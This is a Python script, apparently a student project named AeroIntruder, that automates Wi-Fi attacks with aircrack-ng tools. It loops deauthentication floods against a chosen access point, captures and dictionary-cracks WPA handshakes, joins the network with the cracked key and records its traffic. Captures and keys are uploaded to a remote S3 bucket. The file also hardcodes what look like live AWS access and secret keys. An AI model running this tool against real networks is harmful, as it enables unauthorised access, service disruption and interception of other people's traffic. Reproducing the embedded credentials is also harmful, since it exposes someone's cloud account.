import subprocess
import os
import csv
import boto3
import time

from botocore.exceptions import NoCredentialsError

def enable_monitor_mode(interface):
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error enabling monitor mode: {e}")

def run_airodump(channel, output_prefix, bssid):
    try:
        enable_monitor_mode("wlan0")
        while True:
            subprocess.run(["sudo", "airodump-ng", f"-c{channel}", "-w", output_prefix, "-d", bssid, "wlan0mon"], check=True)
    except subprocess.CalledProcessError:
        pass  # Ignore errors and continue running the command

def run_aireplay(bssid):
    try:
        enable_monitor_mode("wlan0")
        while True:
            subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "wlan0mon"])
    except KeyboardInterrupt:
        print("\nStopping aireplay-ng")
# Add your AWS credentials (replace 'YOUR_ACCESS_KEY' and 'YOUR_SECRET_KEY' with your actual credentials)
AWS_ACCESS_KEY = 'AKIASYC6JSEM4GOM4J4N'
AWS_SECRET_KEY = 'zl2sALYTEPclBLcnvUy3kZsJakeHzi5aIOe0mVnk'
AWS_BUCKET_NAME = 'fyp-aerointruder'

# Create an S3 client
s3 = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)

def upload_to_s3(file_path, s3_key):
    try:
        # Upload the file
        s3.upload_file(file_path, AWS_BUCKET_NAME, s3_key)
        print(f"File uploaded to S3: {s3_key}")
    except FileNotFoundError:
        print("The file was not found")
    except NoCredentialsError:
        print("Credentials not available")

def connect_and_capture(bssid, key, output_prefix):
    try:
        subprocess.run(["sudo", "iwconfig", "wlan0", "essid", bssid, "key", key])

        # Start capturing packets to a Wireshark file with the specified output prefix
        capture_file = f'{output_prefix}_packets.pcap'
        subprocess.run(["sudo", "tshark", "-i", "wlan0", "-w", capture_file])
    except subprocess.CalledProcessError as e:
        print(f"Error connecting and capturing: {e}")


def check_and_crack(output_prefix):
    try:
        while True:
            cap_file = f"{output_prefix}-01.cap"
            if os.path.exists(cap_file):
                print(f"Found capture file {cap_file}")

                # Upload the capture file to S3
                s3_key = f"captures/{output_prefix}-01.cap"  # S3 key where the file will be stored
                upload_to_s3(cap_file, s3_key)

                result = subprocess.run(["sudo", "aircrack-ng", cap_file, "-w", "/usr/share/wordlists/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt"], capture_output=True)
                output = result.stdout.decode('utf-8')
                print(output)

                if 'KEY FOUND!' in output:
                    print("KEY FOUND! Connecting to the network and capturing packets.")

                    # Extract the key from the output (assuming the key is in the format "KEY FOUND! [key]")
                    key_start = output.find('KEY FOUND! [') + len('KEY FOUND! [')
                    key_end = output.find(']', key_start)
                    key = output[key_start:key_end].strip()

                    # Save the key to a text file
                    info_file_path = f"{output_prefix}_key.txt"
                    with open(info_file_path, 'w') as info_file:
                        info_file.write(f"KEY FOUND: {key}\n")

                    # Upload the info file to S3
                    info_s3_key = f"info/{output_prefix}_key.txt"

                    upload_to_s3(info_file_path, info_s3_key)


                    # Pass the output_prefix to connect_and_capture
                    connect_and_capture("known_bssid", key, output_prefix)

                    print("Finished capturing packets. Stopping aircrack-ng.")
                    break
    except KeyboardInterrupt:
        print("\nStopping aircrack-ng")



import os
import time

def intro():
    os.system("clear")
    print("""\033[1;31m
\n
---------------------------------------------------------------------------------------
\n
    _                 ___       _                  _           
   / \   ___ _ __ ___|_ _|_ __ | |_ _ __ _   _  __| | ___ _ __ 
  / _ \ / _ \ '__/ _ \| || '_ \| __| '__| | | |/ _` |/ _ \ '__|
 / ___ \  __/ | | (_) | || | | | |_| |  | |_| | (_| |  __/ |   
/_/   \_\___|_|  \___/___|_| |_|\__|_|   \__,_|\__,_|\___|_|   
                                                        Coded By Team AeroIntruder
---------------------------------------------------------------------------------------\033[0m""")

    # Add an animated loading sequence
    for _ in range(31):
        print("\033[1;31m* \033[0m", end='', flush=True)  # Red stars
        time.sleep(0.1)  # Sleep for 0.1 seconds between each star
    print("\nWelcome to AeroIntruder!\n")


def main():
    while True:
        intro()
        print("\033[1;32m\n1. Run airodump-ng")
        print("2. Run aireplay-ng")
        print("3. Crack the captured handsake")
        print("4. Exit\033[0m")

        choice = input("Enter your choice: ")

        if choice == '1':
            channel = input("Enter the channel: ")
            output_prefix = input("Enter the output prefix: ")
            bssid = input("Enter the BSSID: ")
            run_airodump(channel, output_prefix, bssid)
        elif choice == '2':
            bssid = input("Enter the BSSID: ")
            run_aireplay(bssid)
        elif choice == '3':
            output_prefix = input("Enter the output prefix: ")
            check_and_crack(output_prefix)
        elif choice == '4':
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()


